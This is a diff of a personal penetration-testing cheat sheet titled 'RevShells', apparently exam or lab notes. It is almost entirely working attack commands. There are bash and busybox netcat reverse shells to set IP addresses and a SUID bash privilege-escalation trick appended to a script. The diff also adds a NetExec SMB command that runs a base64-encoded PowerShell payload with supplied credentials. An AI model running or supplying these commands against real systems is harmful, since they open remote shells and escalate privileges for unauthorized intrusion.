@@ -1,6 +1,7 @@
 ## RevShells
 
 #### BASH
+
 ```bash
 bash -i >& /dev/tcp/192.168.45.178/22 0>&1
 
@@ -8,6 +9,14 @@ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' >> full-
 chmod +x full-checkup.sh
 /tmp/pwned -p
 ```
+
+Very fucking reliable.
+
+```bash
+busybox nc 10.10.10.10 1234 -e sh
+busybox nc 10.10.10.10 1234 -e /bin/sh
+```
+
 #### PHP
 
 ```bash
@@ -47,6 +56,12 @@ nc -nlvp 22
 or
 
 192.168.49.140
+
+#### NetExec (Pwn3d! = Shell)
+
+```bash
+netexec smb $ip -u $user -p $pass -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
+```
 
 #### Python
 
